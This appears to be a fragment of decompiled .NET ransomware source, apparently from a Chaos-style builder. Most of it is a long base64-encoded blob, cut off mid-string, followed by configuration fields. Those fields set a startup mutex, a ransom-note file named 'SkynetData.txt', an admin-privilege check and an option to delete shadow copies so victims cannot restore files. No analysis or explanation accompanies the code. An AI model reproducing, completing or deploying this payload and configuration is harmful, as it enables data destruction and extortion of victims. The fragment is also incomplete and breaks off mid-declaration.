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[...string is too long...]";

		// Token: 0x04000010 RID: 16
		public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

		// Token: 0x04000011 RID: 17
		private static string droppedMessageTextbox = "SkynetData.txt";

		// Token: 0x04000012 RID: 18
		private static bool checkAdminPrivilage = true;

		// Token: 0x04000013 RID: 19
		private static bool checkdeleteShadowCopies = true;

		// Token: 0x04000014 RID: 20
